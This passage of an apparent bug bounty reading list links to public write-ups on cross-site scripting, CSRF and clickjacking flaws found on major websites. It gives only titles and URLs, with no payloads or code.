- [Bypassing XSS filtering at anchor Tags](https://medium.com/@arbazhussain/bypassing-xss-filtering-at-anchor-tags-706dde7b8090)
- [XSS by tossing cookies](https://wesecureapp.com/blog/xss-by-tossing-cookies/)
- [Coinbase angularjs dom XSS via kiteworks](http://www.paulosyibelo.com/2017/07/coinbase-angularjs-dom-xss-via-kiteworks.html)
- [Medium Content spoofing and XSS](https://ahussam.me/Medium-content-spoofing-xss/)
- [Managed Apps and music a tale of two XSSes in Google play](https://ysx.me.uk/managed-apps-and-music-a-tale-of-two-xsses-in-google-play/)
- [Making an XSS triggered by CSP bypass on twitter ](https://medium.com/@tbmnull/making-an-xss-triggered-by-csp-bypass-on-twitter-561f107be3e5)
- [Escalating XSS in phantomjs image rendering to SSRF](https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/)
- [Reflected XSS in Simplerisk](https://www.seekurity.com/blog/general/reflected-xss-vulnerability-in-simplerisk/)
- [Stored XSS in the heart of the russian email provider](https://www.seekurity.com/blog/general/stored-xss-in-the-heart-of-the-russian-email-provider-giant-mail-ru/)
- [How I built an XSS worm on atmail](https://www.bishopfox.com/blog/2017/06/how-i-built-an-xss-worm-on-atmail/)
- [XSS on bugcrowd and so many other websites main domain](https://blog.witcoat.com/2018/05/30/xss-on-bugcrowd-and-so-many-other-websites-main-domain/)
- [Godaddy XSS affects parked domains redirector Processor](https://www.seekurity.com/blog/write-ups/godaddy-xss-affects-parked-domains-redirector-processor/)
- [Stored XSS in Google image search](https://sites.google.com/site/bugbountybughunter/home/stored-xss-in-google-image-search)
- [A pair of plotly bugs stored XSS abd AWS metadata](https://ysx.me.uk/a-pair-of-plotly-bugs-stored-xss-and-aws-metadata-ssrf/)
- [Near universal XSS in mcafee web gateway](https://blog.ettic.ca/near-universal-xss-in-mcafee-web-gateway-cf8dfcbc8fc3)
- [Penetrating Pornhub XSS vulns](https://www.jonbottarini.com/2017/03/16/penetrating-pornhub-xss-vulns-galore-plus-a-cool-shirt/)
- [How I found a 5000 Google maps XSS by fiddling with protobuf](https://medium.com/@marin_m/how-i-found-a-5-000-google-maps-xss-by-fiddling-with-protobuf-963ee0d9caff)
- [Airbnb when bypassing json encoding XSS filter WAF CSP and auditior turns into eight vulnerabilities](https://buer.haus/2017/03/08/airbnb-when-bypassing-json-encoding-xss-filter-waf-csp-and-auditor-turns-into-eight-vulnerabilities/)
- [Lightwight markup a trio of persistent XSS in gitlab](https://ysx.me.uk/lightweight-markup-a-trio-of-persistent-xss-in-gitlab/)
- [XSS ONE BAY](https://whitehatnepal.tumblr.com/post/153333332112/xssonebay)
- [SVG XSS in unifi](https://guptashubham.com/svg-xss-in-unifi-v5-0-2/)
- [Stored XSS in unifi V4.8.12 controller](https://guptashubham.com/stored-xss-in-unifi-v4-8-12-controller/)
- [Turning self XSS into good XSS v2](https://httpsonly.blogspot.com/2016/08/turning-self-xss-into-good-xss-v2.html)
- [SWF XSS DOM Based XSS](https://guptashubham.com/swf-xss-dom-based-xss/)
- [XSS filter bypass in Yahoo Dev flurry](https://guptashubham.com/xss-filter-bypass-in-yahoo-dev-flurry-com/)
- [XSS on Flickr](https://guptashubham.com/xss-on-flickr/)
- [Two vulnerabilities makes an exploit XSS and csrf in bing](https://medium.com/bugbountywriteup/two-vulnerabilities-makes-an-exploit-xss-and-csrf-in-bing-cd4269da7b69)
- [Runkeeper stored XSS](https://www.seekurity.com/blog/general/runkeeper-stores-xss-vulnerability/)
- [Google sleeping XSS awakens 5k bounty](https://blog.it-securityguard.com/bugbounty-sleeping-stored-google-xss-awakens-a-5000-bounty/)
- [Poisoning the well compromising godaddy customer support with blind XSS](https://thehackerblog.com/poisoning-the-well-compromising-godaddy-customer-support-with-blind-xss/index.html)
- [UBER turning self XSS to good XSS](https://whitton.io/articles/uber-turning-self-xss-into-good-xss/)
- [XSS on facebook via png content types](https://whitton.io/articles/xss-on-facebook-via-png-content-types/)
- [Cloudflare XSS](https://ahussam.me/Cloudflare-xss/)
- [How I found XSS Vulnerability in Google ](https://zombiehelp54.blogspot.com/2015/09/how-i-found-xss-vulnerability-in-google.html)
- [XSS to RCE](https://matatall.com/xss/rce/bugbounty/2015/09/08/xss-to-rce.html)
- [One payload to XSS them all](https://ahussam.me/One-payload-to-xss-them/)
- [Self XSS on komunitas](https://medium.com/@bughunter.sec7/self-xss-on-komunitas-bukalapak-com-b8a28dce4fbd)
- [Reclected XSS on alibabacloud](https://medium.com/@bughunter.sec7/reflected-xss-on-alibabacloud-com-4e652fcca22f)
- [Self XSS on komunitas bukalapak](https://medium.com/@bughunter.sec7/self-xss-on-komunitas-bukalapak-com-b8a28dce4fbd)
- [A real XSS in OLX](https://medium.com/@paulorcchoupina/a-real-xss-in-olx-7727ae89c640)
- [Self XSS using IE adobes](https://medium.com/@80vul/from-http-domain-to-res-domain-xss-by-using-ie-adobes-pdf-activex-plugin-9f2a72a87aff)
- [Stealing local storage through XSS](http://blog.h4rsh4d.com/2019/04/stealing-local-storage-data-through-xss.html)
- [1000 USD in 5mins Stored XSS in Outlook](https://omespino.com/write-up-1000-usd-in-5-minutes-xss-stored-in-outlook-com-ios-browsers/)
- [OLX reflected XSS](https://medium.com/@abaykandotcom/olx-bug-bounty-reflected-xss-adb3095cd525)
- [My first stored XSS on edmodo.com](https://medium.com/@ZishanAdThandar/my-first-stored-xss-on-edmodo-com-540a33349662)
- [Hack your form new vector for BXSS](https://medium.com/@GeneralEG/hack-your-form-new-vector-for-blind-xss-b7a50b808016)
- [How I found Blind XSS vulnerability in redacted.com](https://medium.com/@newp_th/how-i-find-blind-xss-vulnerability-in-redacted-com-33af18b56869)
- [3 XSS in protonmail for iOS](https://medium.com/@vladimirmetnew/3-xss-in-protonmail-for-ios-95f8e4b17054)
- [XSS in edmodo wihinin 5 mins](https://medium.com/@valakeyur/xss-in-edmodo-within-5-minute-my-first-bug-bounty-889e3da6167d)
- [Stil work redirect Yahoo subdomain XSS](https://www.mohamedharon.com/2019/02/still-work-redirect-yahoo-subdomain-xss.html)
- [XSS in azure devOps](https://5alt.me/2019/02/xss-in-azure-devops/)
- [Shopify reflected XSS](https://medium.com/@modam3r5/reflected-xss-at-https-photos-shopify-com-ea696db3915c)
- [Muliple Stored XSS on tokopedia](https://apapedulimu.click/multiple-stored-xss-on-tokopedia/)
- [Stored XSS on edmodo](https://medium.com/@futaacmcyber/stored-xss-on-edmodo-11a3fbc6b6d0)
- [A unique XSS scenario 1000 Bounty](https://medium.com/@rohanchavan/a-unique-xss-scenario-1000-bounty-347f8f92fcc6)
- [Protonmail XSS Stored](https://medium.com/@ChandSingh/protonmail-xss-stored-b733031ac3b5)
- [Chaining tricky ouath exploitation to stored XSS](https://medium.com/@nahoragg/chaining-tricky-oauth-exploitation-to-stored-xss-b67eaea4aabd)
- [Antihack XSS to php uplaod](https://blog.saycure.io/2019/01/24/antihack-xss-2-php-upload/)
- [Reflected XSS in zomato](https://medium.com/@sudhanshur705/reflected-xss-in-zomato-f892d6887147)
- [XSS through SWF file](https://medium.com/@friendly_/xss-through-swf-file-4f04af7b0f59)
- [Hackyourform BXSS](https://generaleg0x01.com/2019/01/13/hackyourform-bxss/)
- [Reflected XSS on ASUS](https://medium.com/@thejuskrishnan911/reflected-xss-on-asus-568ce0541171)
- [Stored XSS via Alternate text at zendesk support](https://medium.com/@hariharan21/stored-xss-via-alternate-text-at-zendesk-support-8bfee68413e4)
- [How I stumbled upon a stored XSS : my first bug bounty story](https://medium.com/@parthshah14031998/how-i-stumbled-upon-a-stored-xss-my-first-bug-bounty-story-2793300d82bb)
- [Cookie based Self XSS to Good XSS](https://medium.com/bugbountywriteup/cookie-based-self-xss-to-good-xss-d0d1ca16dd0e)
- [Reflected XSS on amazon](https://medium.com/@newp_th/reflected-xss-on-ws-na-amazon-adsystem-com-amazon-f1e55f1d24cf)
- [XSS worm  : a creative use of web application vulnerability ](https://blog.compass-security.com/2018/12/xss-worm-a-creative-use-of-web-application-vulnerability/)
- [Google code in XSS](https://websecblog.com/vulns/google-code-in-xss/)
- [Self XSS on indeed.com](https://medium.com/@sampanna/self-xss-in-indeed-com-e0c99c104cba)
- [How I accidentally found XSS in Protonmail for iOS app](https://www.secu.ninja/2018/12/04/how-to-accidentally-find-a-xss-in-protonmail-ios-app/)
- [XML XSS in yandex.ru by accident](https://medium.com/@0ktavandi/xml-xss-in-yandex-ru-by-accident-7e63c692b4c0)
- [Critical Stored XSS vulnerability](https://www.hackerinside.me/2018/11/critical-stored-xss-vulnerability.html)
- [XSS bypass using META tag in realestate.postnl.nl ](https://medium.com/bugbountywriteup/xss-bypass-using-meta-tag-in-realestate-postnl-nl-32db25db7308)
- [Edmodo XSS bug](https://medium.com/@sameerphad72/edmodo-xss-bug-9c0fc9bdd0bf)
- [XSS in hiden input fields](https://portswigger.net/blog/xss-in-hidden-input-fields)
- [How I discovered XSS that affected over 20 uber subdomains](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)
- [DOM based XSS or why you should not rely on cloudflare too much](https://medium.com/bugbountywriteup/dom-based-xss-or-why-you-should-not-rely-on-cloudflare-too-much-a1aa9f0ead7d)
- [XSS in dynamics 365](https://medium.com/@tim.kent/xss-in-dynamics-365-25c800aac473)
- [XSS deface with html and how to convert the html into charcode](https://medium.com/@ariffadhlullah2310/xss-deface-with-html-and-how-to-convert-the-html-into-charcode-f0c62dd5ef3f)
- [Cookie based injection XSS making explitable with exploiting other vulns](https://medium.com/@agrawalsmart7/cookie-based-injection-xss-making-exploitable-with-out-exploiting-other-vulns-81132ca01d67)
- [XSS with put in ghost blog](https://www.itsecguy.com/xss-with-put-in-ghost-blog/)
- [XSS using a Bug in safari and why blacklists are stupid](https://labs.detectify.com/2018/10/19/xss-using-a-bug-in-safari-and-why-blacklists-are-stupid/)
- [Magic XSS with two parameters](https://medium.com/@m4shahab1/magic-xss-with-two-parameters-463559b03949)
- [DOM XSS bug affecting tinder shopify Yelp](https://www.vpnmentor.com/blog/dom-xss-bug-affecting-tinder-shopify-yelp/)
- [Persistent XSS unvalidated open graph embed at linkedin.com](https://medium.com/@jonathanbouman/persistent-xss-unvalidated-open-graph-embed-at-linkedin-com-db6188acedd9)
- [My first 0day exploit CSP Bypass Reflected XSS](https://medium.com/@alicanact60/my-first-0day-exploit-csp-bypass-reflected-xss-bugbounty-c7efa4bed3d7)
- [Google Stored XSS in payments](https://medium.com/@brs.sgdc/google-stored-xss-in-payments-350cd7ba0d1b)
- [XSS on dropbox](https://www.kumar.ninja/2018/09/xss-surveydropboxcom.html)
- [Weaponizing XSS attacking internal domains ](https://medium.com/@rahulraveendran06/weaponizing-xss-attacking-internal-domains-d8ba1cbd106d)
- [How I XSSed UBER and bypassed CSP](https://medium.com/@efkan162/how-i-xssed-uber-and-bypassed-csp-9ae52404f4c5)
- [RXSS and CSRF bypass to Account takeover](https://nirmaldahal.com.np/r-xss-csrf-bypass-to-account-takeover/)
- [Another XSS in google collaboratory](https://blog.bentkowski.info/2018/09/another-xss-in-google-colaboratory.html)
- [How I bypassed AKAMAI waf in overstock.com ](https://medium.com/@0ktavandi/how-i-bypassed-akamai-kona-waf-xss-in-overstock-com-f205b0e71a0d)
- [Reflected XSS at philips.com](https://medium.com/@jonathanbouman/reflected-xss-at-philips-com-e48bf8f9cd3c)
- [XSS vulnerabilities in multiple iframe busters affecting top tier sites](https://randywestergren.com/xss-vulnerabilities-in-multiple-iframe-busters-affecting-top-tier-sites/)
- [Reflected DOM XSS and clickjacking silvergoldbull](https://medium.com/@maxon3/reflected-dom-xss-and-clickjacking-on-https-silvergoldbull-de-bt-html-daa36bdf7bf0)
- [Stored XSS vulnerability in h1 private](https://www.hackerinside.me/2018/09/stored-xss-vulnerability-in-h1c-private.html)
- [Authbypass SQLi and XSS](https://blog.securitybreached.org/2018/09/09/zol-zimbabwe-authbypass-sqli-xss/)
- [Stored XSS vulnerability in tumblr](https://www.hackerinside.me/2018/09/stored-xss-vulnerability-in-tumblr.html)
- [XSS in google code jam](https://websecblog.com/vulns/reflected-xss-in-google-code-jam/)
- [Mapbox XSS](https://www.mohamedharon.com/2018/08/mapboxxss.html)
- [My first valid XSS](https://medium.com/@nandwanajatin25/my-first-valid-xss-hackerone-f8ba0a7c647)
- [Stored XSS in webcomponents.org](https://websecblog.com/vulns/stored-xss-in-webcomponents-org/)
- [3 minutes XSS](https://medium.com/bugbountywriteup/3-minutes-xss-71e3340ad66b)
- [icloud.com DOM based XSS](https://medium.com/@musabalhussein/icloud-com-dom-based-xss-bugbounty-6f88cb865b18)
- [XSS at hubspot and in email areas](https://medium.com/@friendly_/xss-at-hubspot-and-xss-in-email-areas-674fa39d5248)
- [Self XSS leads to blind XSS and Reflected XSS](https://medium.com/@friendly_/self-xss-leads-to-blind-xss-and-reflected-xss-950b1dc24647)
- [Refltected XSS primagames.com](https://medium.com/@friendly_/reflected-xss-primagames-com-c7a641912626)
- [Stored XSS in gameskinny](https://medium.com/@friendly_/stored-xss-in-gameskinny-aa26c6a6ae40)
- [Blind XSS in Chrome experments Google](https://evanricafort.blogspot.com/2018/08/blind-xss-in-chrome-experiments-google.html)
- [Yahoo two XSSI vulnerabilities chained to steal user information (750$)](https://medium.com/@0xHyde/yahoo-two-xssi-vulnerabilities-chained-to-steal-user-information-750-bounty-e9bc6a41a40a)
- [How I found XSS on amazon](https://medium.com/@codingkarma/how-i-found-xss-on-amazon-f62b50f1c336)
- [A blind XSS in messengers twins](http://omespino.com/write-up-telegram-bug-bounty-whatsapp-n-a-blind-xss-stored-ios-in-messengers-twins-who-really-care-about-your-security/)
- [XSS in microsoft Subdomain](https://medium.com/@sudhanshur705/xss-in-microsoft-subdomain-81c4e46d6631)
- [Persistent XSS at ah.nl](https://medium.com/@jonathanbouman/persistent-xss-at-ah-nl-198fe7b4c781)
- [The 12000 intersection betwenn clickjaking , XSS and DOS](https://samcurry.net/the-12000-intersection-between-clickjacking-xss-and-denial-of-service/)
- [XSS in google collaboratory CSP bypass](https://blog.bentkowski.info/2018/06/xss-in-google-colaboratory-csp-bypass.html)
- [How I found blind XSS in apple](https://medium.com/@tahasmily2013m/how-i-found-blind-xss-in-apple-c890775e745a)
- [Reflected XSS on amazon.com](https://medium.com/@jonathanbouman/reflected-client-xss-amazon-com-7b0d3cec787)
- [How I found XSS in 360totalsecurity](https://medium.com/@tahasmily2013m/i-have-found-vulnerability-in-360totalsecurity-is-reflected-xss-in-3a6bd602bb5a)
- [The 2.5 BTC Stored XSS](https://medium.com/@khaled.hassan/the-2-5-btc-stored-xss-f2f9393417f2)
- [XSS Vulnerability in Netflix ](https://medium.com/@black_b/vulnerability-netflix-cross-site-scripting-xss-d44010142e2c)
- [A story of a UXSS via DOM XSS clickjacking in steam inventory helper](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/index.html)
- [How I found XSS via SSRF vulnerability](https://medium.com/@adeshkolte/how-i-found-xss-via-ssrf-vulnerability-adesh-kolte-873b30a6b89f)
- [Searching for XSS found ldap injection](https://www.nc-lp.com/blog/searching-for-xss-found-ldap-injection)
- [how I converted SSRF to XSS in a SSRF vulnerable JIRA](https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158)
- [Reflected XSS in Yahoo subdomain](https://www.mohamedharon.com/2018/05/reflected-xss-in-hk-yahoo.html)
- [Account takeover and blind XSS](https://blog.witcoat.com/2018/05/30/account-takeover-and-blind-xss-go-pro-get-bugs/)
- [How I found 5 stored XSS on a private program](https://cybristerboy.blogspot.com/2018/05/how-i-found-5-store-xss-on-private.html)
- [Persistent XSS to steal passwords(Paypal)](https://wesecureapp.com/blog/persistent-xss-to-steal-passwords-paypal/)
- [Self XSS + CSRF to stored XSS](https://medium.com/@renwa/self-xss-csrf-to-stored-xss-54f9f423a7f1)
- [Stored XSS in yahoo and subdomains ](https://medium.com/@ozil.hakim/stored-xss-in-yahoo-and-all-subdomains-bbcaa7c3b8d)
- [XSS in microsoft](https://medium.com/@hacker_eth/xss-in-microsoft-7a70416aee75)
- [Blind XSS at customer support panel](https://blog.hx01.me/2018/05/blind-xss-to-customer-support-panel.html)
- [Reflected XSS on stackoverflow](https://medium.com/@newp_th/reflected-xss-on-stack-overflow-b8366a855472)
- [Stored XSS in Yahoo](https://medium.com/@TheShahzada/stored-xss-in-yahoo-b0878ecc97e2)
- [XSS 403 forbidden Bypass](https://medium.com/@nuraalamdipu/xss-403-forbidden-bypass-write-up-e070de52bc06)
- [Turning self XSS into non self XSS via authorization issue at paypal](https://medium.com/@YoKoKho/turning-self-xss-into-non-self-stored-xss-via-authorization-issue-at-paypal-tech-support-and-brand-3046f52ac16b)
- [A story of stored XSS bypass](https://medium.com/@prial261/story-of-a-stored-xss-bypass-26e6659f807b)
- [Mangobaaz hacked XSS to credentials](https://blog.hx01.me/2018/04/mangobaaz-hacked-xss-to-credentials.html)
- [How I got stored XSS using file upload](https://medium.com/@vis_hacker/how-i-got-stored-xss-using-file-upload-5c33e19df51e)
- [Bypassing CSP to abusing XSS filter in edge](https://medium.com/bugbountywriteup/bypass-csp-by-abusing-xss-filter-in-edge-43e9106a9754)
- [XSS to session Hijacking](https://medium.com/@yassergersy/xss-to-session-hijack-6039e11e6a81)
- [Reflected XSS on www.zomato.com](https://www.mohamedharon.com/2018/04/reflected-xss-on-wwwzomatocom-by.html)
- [XSS in subdomain of yahoo](https://www.mohamedharon.com/2018/03/xss-in-subdomain-httpsyefgrantsyahoocom.html)
- [XSS in yahoo.net subdomain ](https://www.mohamedharon.com/2018/03/xss-in-sportstwcampaignyahoonet.html)
- [Reflected XSS moongaloop swf version 62x](https://www.mohamedharon.com/2018/03/reflected-xss-moogaloop-swf-version-62x.html)
- [Google adwords 3133.7 Stored XSS](https://medium.com/@Alra3ees/google-adwords-3133-7-stored-xss-27bb083b8d27)
- [How I found a surprising XSS vulnerability on oracle netsuite](https://medium.com/bug-bounty-hunting/how-i-found-a-surprising-xss-vulnerability-on-oracle-netsuite-2d48b7fcf0c8)
- [Stored XSS on snapchat](https://medium.com/@mrityunjoy/stored-xss-on-snapchat-5d704131d8fd)
- [How I was able to bypass XSS protection on h1 private program](https://blog.securitybreached.org/2018/02/02/how-i-was-able-to-bypass-xss-protection-on-hackerones-private-program/)
- [Reflected XSS possible](https://www.mohamedharon.com/2018/01/reflected-xss-possible-server-side.html)
- [XSS via angularjs template injection hostinger](https://blog.ibrahimdraidia.com/xss-via-angularjs-template-injection_hostinger/)
- [Microsoft follow feature XSS (CVE-2017-8514)](https://medium.com/@adeshkolte/microsoft-sharepoints-follow-feature-xss-cve-2017-8514-adesh-kolte-d78d701cd064)
- [XSS protection bypass made my quickest bounty ever](https://medium.com/@Skylinearafat/xss-protection-bypass-made-my-quickest-bounty-ever-f4fd970c9116)
- [Taking note XSS to RCE in the simplenote electron client](https://ysx.me.uk/taking-note-xss-to-rce-in-the-simplenote-electron-client/)
- [VMWARE official vcdx reflected XSS](https://medium.com/@honcbb/vmware-official-vcdx-reflected-xss-90e69a3c35e1)
- [How I pwned a company using IDOR and Blind XSS](https://www.ansariosama.com/2017/11/how-i-pwned-company-using-idor-blind-xss.html)
- [From Recon to DOM based XSS](https://medium.com/@abdelfattahibrahim/from-recon-to-dom-based-xss-f279602a14cf)
- [Local file read via XSS ](http://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)
- [Non persistent XSS at microsoft](https://medium.com/@adeshkolte/non-persistent-xss-at-microsoft-adesh-kolte-ad36b1b4a325)
- [A Stored XSS in google (double kill)](https://ysx.me.uk/app-maker-and-colaboratory-a-stored-google-xss-double-bill/)
- [Filter bypass to Reflected XSS on finance.yahoo.com (mobile version)](https://medium.com/@saamux/filter-bypass-to-reflected-xss-on-https-finance-yahoo-com-mobile-version-22b854327b27)
- [900$ XSS in yahoo : recon wins](https://medium.com/bugbountywriteup/900-xss-in-yahoo-recon-wins-65ee6d4bfcbd)
- [How I bypassed practos firewall and triggered an XSS vulnerability](https://medium.com/bugbountywriteup/how-i-bypassed-practos-firewall-and-triggered-a-xss-b30164a8f1dc)
- [Stored XSS to full information disclosure](https://guptashubham.com/stored-xss-to-full-information-disclosure/)
- [Story of parameter specific XSS](http://www.noob.ninja/2017/09/story-of-parameter-specific-xss.html)
- [Chaining self XSS with UI redressing leading to session hijacking](https://medium.com/bugbountywriteup/chaining-self-xss-with-ui-redressing-is-leading-to-session-hijacking-pwn-users-like-a-boss-efb46249cd14)
- [Stored XSS with arbitrary cookie installation](https://medium.com/@arbazhussain/stored-xss-with-arbitrary-cookie-installation-567931433c7f)
- [Reflective XSS and Open redirect on indeed.com subdomain](https://medium.com/@SyntaxError4/reflective-xss-and-open-redirect-on-indeed-com-subdomain-b4ab40e40c83)
- [How I found reflected XSS on Yahoo subdomain](https://medium.com/@SyntaxError4/how-i-found-reflective-xss-in-yahoo-subdomain-3ad4831b386e)
- [Dont just alert(1) because XSS is more fun](https://medium.com/@armaanpathan/dont-just-alert-1-because-xss-is-for-fun-f88cfb88d5b9)
- [UBER XSS by helpe of KNOXSS](https://medium.com/@Alra3ees/my-write-up-about-uber-cross-site-scripting-by-help-of-knoxss-b1b56f8d090)
- [Reflected XSS in Yahoo](https://medium.com/@TheShahzada/reflected-xss-in-yahoo-6e2b6b177448)
- [Reflected XSS on ww.yahoo.com](https://medium.com/@saamux/reflected-xss-on-www-yahoo-com-9b1857cecb8c)
- [XSS because of wrong content type header](https://bugbaba.blogspot.com/2017/08/xss-because-of-wrong-content-type-header.html)

## Cross Site Request Forgery (CSRF)

- [How a simple CSRF attack turned into a P1](https://ladysecspeare.wordpress.com/2020/04/05/how-a-simple-csrf-attack-turned-into-a-p1-level-bug/)
- [How I exploited the json csrf with method override technique](https://medium.com/@secureITmania/how-i-exploit-the-json-csrf-with-method-override-technique-71c0a9a7f3b0)
- [How I found CSRF(my first bounty)](https://medium.com/@rajeshranjan457/how-i-csrfd-my-first-bounty-a62b593d3f4d)
- [Exploiting websocket application wide XSS and CSRF](https://medium.com/@osamaavvan/exploiting-websocket-application-wide-xss-csrf-66e9e2ac8dfa)
- [Site wide CSRF on popular program](https://fellchase.blogspot.com/2020/02/site-wide-csrf-on-popular-program.html)
- [Using CSRF I got weird account takeover](https://flex0geek.blogspot.com/2020/02/using-csrf-i-got-weird-account-takeover.html)
- [CSRF CSRF CSRF](https://medium.com/@navne3t/csrf-csrf-csrf-f203e6452a9c)
- [Google Bugbounty CSRF in learndigital.withgoogle.com](https://santuysec.com/2020/01/21/google-bug-bounty-csrf-in-learndigital-withgoogle-com/)
- [CSRF token bypass [a tale of 2k bug]](https://medium.com/@sainttobs/csrf-token-bypasss-a-tale-of-my-2k-bug-ff7f51166ea1)
- [2FA bypass via CSRF attack](https://medium.com/@vbharad/2-fa-bypass-via-csrf-attack-8f2f6a6e3871)
- [Stored iframe injection CSRF account takeover](https://medium.com/@irounakdhadiwal999/stored-iframe-injection-csrf-account-takeover-42c93ad13f5d)
- [Instagram delete media CSRF](https://blog.darabi.me/2019/12/instagram-delete-media-csrf.html)
- [An inconsistent CSRF](https://smaranchand.com.np/2019/10/an-inconsistent-csrf/)
- [Bypass CSRF with clickjacking worth 1250](https://medium.com/@saadahmedx/bypass-csrf-with-clickjacking-worth-1250-6c70cc263f40)
- [Sitewide CSRF graphql](https://rafiem.github.io/bugbounty/tokopedia/site-wide-csrf-graphql/)
- [Account takeover using CSRF json based](https://medium.com/@shub66452/account-takeover-using-csrf-json-based-a0e6efd1bffc)
- [CORS to CSRF attack](https://medium.com/@osamaavvan/cors-to-csrf-attack-c33a595d441)
- [My first CSRF to account takeover](https://medium.com/@nishantrustlingup/my-first-csrf-to-account-takeover-worth-750-1332641d4304)
- [4x chained CSRFs chained for account takeover](https://medium.com/a-bugz-life/4x-csrfs-chained-for-company-account-takeover-f9fada416986)
- [CSRF can lead to stored XSS](https://medium.com/bugbountywriteup/csrf-attack-can-lead-to-stored-xss-f40ba91f1e4f)
- [Yet other examples of abusing CSRF in logout](https://soroush.secproject.com/blog/2019/04/yet-other-examples-of-abusing-csrf-in-logout/)
- [Wordpress CSRF to RCE](https://blog.ripstech.com/2019/wordpress-csrf-to-rce/)
- [Bruteforce user IDs via CSRF to delete all the users with CSRF attack](https://medium.com/@armaanpathan/brute-forcing-user-ids-via-csrf-to-delete-all-users-with-csrf-attack-216ccd4d832c)
- [CSRF Bypass using cross frame scripting](https://medium.com/@mr_hacker/csrf-bypass-using-cross-frame-scripting-c349d6f33eb6)
- [Account takeover via CSRF](https://medium.com/@adeshkolte/lintern-ute-account-takeover-via-csrf-adesh-kolte-307f7065ee74)
- [A very useful technique to bypass the CSRF protection](https://medium.com/@Skylinearafat/a-very-useful-technique-to-bypass-the-csrf-protection-for-fun-and-profit-471af64da276)
- [CSRF account takeover exlpained automated manual bugbounty](https://medium.com/bugbountywriteup/csrf-account-takeover-explained-automated-manual-bug-bounty-447e4b96485b)
- [CSRF to account takeover](https://medium.com/bugbountywriteup/csrf-account-takeover-in-a-company-worth-1b-6e966813c262)
- [How I got 500USD from microsoft for CSRF vulnerability](https://medium.com/@adeshkolte/how-i-got-500-from-microsoft-for-csrf-vulnerability-700accaf48b9)
- [Critical Bypass CSRF protection](https://medium.com/bugbountywriteup/critical-bypass-csrf-protection-on-ibm-313ffb68dd0c)
- [RXSS CSRF bypass to full account takeover](https://nirmaldahal.com.np/r-xss-csrf-bypass-to-account-takeover/)
- [Youtube CSRF](https://www.sagarvd.me/2018/09/youtube-csrf.html)
- [Self XSS + CSRF = Stored XSS](https://medium.com/@renwa/self-xss-csrf-to-stored-xss-54f9f423a7f1)
- [Ribose IDOR with simple CSRF bypass unrestrcited changes and deletion to other photo profile](https://medium.com/@YoKoKho/ribose-idor-with-simple-csrf-bypass-unrestricted-changes-and-deletion-to-other-photo-profile-e4393305274e)
- [JSON CSRF attack on a social networking site](https://medium.com/@pig.wig45/json-csrf-attack-on-a-social-networking-site-hackerone-platform-3d7aed3239b0)
- [Hacking facebook oculus integration CSRF](https://www.josipfranjkovic.com/blog/hacking-facebook-oculus-integration-csrf)
- [Amazon leaking CSRF token using service worker](https://ahussam.me/Amazon-leaking-csrf-token-using-service-worker/)
- [Facebook graphql CSRF](https://philippeharewood.com/facebook-graphql-csrf/)
- [Chain the vulnerabilities and take your report impact on the moon csrf to html injection](https://medium.com/@armaanpathan/chain-the-vulnerabilities-and-take-your-report-impact-on-the-moon-csrf-to-html-injection-which-608fa6e74236)
- [Partial CSRF to Full CSRF](https://medium.com/@ciph3r7r0ll/that-escalated-quickly-from-partial-csrf-to-reflected-xss-to-complete-csrf-to-stored-xss-6ba8103069c2)
- [Stealing access token of one drive integration by chain csrf vulnerability ](https://medium.com/@arbazhussain/stealing-access-token-of-one-drive-integration-by-chaining-csrf-vulnerability-779f999624a7)
- [Metasploit web project kill all running taks CSRF CVE-2017-5244](https://www.seekurity.com/blog/general/metasploit-web-project-kill-all-running-tasks-csrf-cve-2017-5244/)
- [Messenger site wide CSRF](https://whitton.io/articles/messenger-site-wide-csrf/)
- [Hacking Facebook CSRF device login flow](https://www.josipfranjkovic.com/blog/hacking-facebook-csrf-device-login-flow)
- [Two vulnerabilities makes an exploit XSS and CSRF in bing](https://medium.com/bugbountywriteup/two-vulnerabilities-makes-an-exploit-xss-and-csrf-in-bing-cd4269da7b69)
- [How I bypassed Facebook in 2016](https://medium.com/blog.darabi.me/2016/05/how-i-bypassed-facebook-csrf-in-2016.html)
- [Ubiquiti bugbounty unifi generic CSRF protection Bypass ](https://www.rcesecurity.com/2016/02/ubiquiti-bug-bounty-unifi-v3-2-10-generic-csrf-protection-bypass/)
- [Bypass Facebook CSRF](https://blog.darabi.me/2015/04/bypass-facebook-csrf.html)
- [Facebook CSRF full account takeover](https://www.josipfranjkovic.com/blog/facebook-csrf-full-account-takeover)

## Clickjacking (UI redressing attack)

- [Google Bug bounty Clickjacking on Google payment](https://santuysec.com/2020/03/06/google-bug-bounty-clickjacking-on-google-payment-1337/)
- [Google APIs Clickjacking worth 1337$](https://medium.com/@godofdarkness.msf/google-apis-clickjacking-1337-7a3a9f3eb8df)
- [Clickjacking + XSS on Google org](https://websecblog.com/vulns/clickjacking-xss-on-google-org/)
- [Bypass CSRF with clickjacking on Google org ](https://medium.com/@saadahmedx/bypass-csrf-with-clickjacking-worth-1250-6c70cc263f40)
- [1800 worth Clickjacking](https://medium.com/@osamaavvan/1800-worth-clickjacking-1f92e79d0414)
- [Account takeover with clickjacking](https://medium.com/@osamaavvan/account-taker-with-clickjacking-ace744842ec3)
- [Clickjacking on google CSE](https://medium.com/@abaykandotcom/clickjacking-on-google-cse-6636bba72d20)
- [How I accidentally found clickjacking in Facebook](https://malfind.com/index.php/2018/12/21/how-i-accidentaly-found-clickjacking-in-facebook/)
- [Clickjacking on google myaccount worth 7500](https://apapedulimu.click/clickjacking-on-google-myaccount-worth-7500/)
- [Clickjacking in google docs and void typing feature](https://medium.com/@raushanraj_65039/clickjacking-in-google-docs-and-voice-typing-feature-c481d00b020a)
- [Reflected DOM XSS and Clickjacking](https://medium.com/@maxon3/reflected-dom-xss-and-clickjacking-on-https-silvergoldbull-de-bt-html-daa36bdf7bf0)
- [binary.com clickjacking vulnerability exploiting HTML5 security features](https://medium.com/@ameerassadi/binary-com-clickjacking-vulnerability-exploiting-html5-security-features-368c1ff2219d)
- [12000 intersection betwen clickjacking XSS and denial of service](https://samcurry.net/the-12000-intersection-between-clickjacking-xss-and-denial-of-service/)
